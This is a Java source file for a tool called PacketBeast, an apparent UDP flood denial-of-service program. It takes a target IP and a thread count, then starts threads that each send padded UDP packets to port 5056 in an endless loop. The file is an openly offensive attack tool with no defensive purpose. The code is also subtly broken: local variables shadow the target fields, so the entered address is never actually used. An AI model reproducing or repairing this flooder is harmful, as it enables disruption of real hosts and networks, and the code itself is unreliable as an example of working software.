import java.util.concurrent.atomic.AtomicBoolean;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;

public class PacketBeast
{
    String targetIp;
    int threadsNum;
    String buffer = "datadatadatadatadatadata";

    public String setInput(String ipAddress, String threadsNumber) //Set the information needed for the attack
    {
        String output;
        try
        {
            if(ipAddress.length() > 0 && threadsNumber.length() > 0)
            {
                output = "Fields are filled.";
                String targetIp = ipAddress;
                int threadsNum = Integer.parseInt(threadsNumber);
                for(int i = 0; i < 100; i++)
                {
                    buffer += "aaaa";
                }
                StartThread(threadsNum);
                return output;
            }
            else
            {
                output = "Fill the required fields!";
                return output;
            }
        }
        catch(Exception e)
        {
            output = "Fill the required fields correctly";
            e.printStackTrace();
            return output;
        }
    }

    public void StartThread(int threadsNumber)
    {

        for(int i = 0; i < threadsNumber;i++)
        {
            PacketBeastThread pbt = new PacketBeastThread();
            pbt.start();
        }
    }

    public class PacketBeastThread extends Thread
    {
        AtomicBoolean running = new AtomicBoolean(true);
        InetAddress targetAddress;
        byte data[] = buffer.getBytes();

        @Override
        public void run()
        {
            while(running.get())
            {
                try
                {

                    attack();
                }
                catch(Exception ex)
                {
                    ex.printStackTrace();
                }
            }
        }

        public void attack() throws Exception //Start the attack
        {
            try
            {

                targetAddress = InetAddress.getByName(targetIp);
                DatagramSocket socket = new DatagramSocket();
                DatagramPacket packet = new DatagramPacket(data, data.length, targetAddress, 5056);
                socket.send(packet);
                //System.out.println("Send!");
            }
            catch(Exception ex)
            {
                ex.printStackTrace();
            }

        }
    }
}